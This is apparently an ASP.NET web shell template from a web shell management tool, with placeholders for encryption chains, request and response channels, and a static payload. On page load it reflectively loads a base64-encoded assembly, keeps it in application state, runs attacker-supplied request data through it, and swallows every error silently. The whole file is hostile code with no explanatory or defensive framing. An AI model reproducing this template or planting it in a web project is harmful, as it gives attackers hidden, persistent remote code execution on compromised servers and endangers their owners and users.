<%@ Page Language="C#" %>
<script runat="server">
    {globalCode}
    protected void Page_Load(object sender, EventArgs e)
    {
        {responseBodyAppendStart}
        try {
            {variable}
            {requestChannel}
            {requestDecryptionChain}
            if (Application["{randomStr}"] == null) {
                Application["{randomStr}"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",
                    new System.Type[] {
                        typeof (byte[])
                    }).Invoke(null, new object[] {
                    Convert.FromBase64String("{staticPayload}");
                });
            }

            System.IO.MemoryStream memoryStream = new System.IO.MemoryStream();
            System.IO.BinaryWriter arrOut = new System.IO.BinaryWriter(memoryStream);
            object o = ((System.Reflection.Assembly)  Application["{randomStr}"]).CreateInstance("LY");
            o.Equals(requestData);
            o.Equals(memoryStream);
            o.ToString();
            byte[] responseData = memoryStream.ToArray();
            memoryStream.SetLength(0);
            {responseEncryptionChain}
            {responseChannel}

        } catch (System.Exception) {

        }
        {responseBodyAppendEnd}
    }

</script>
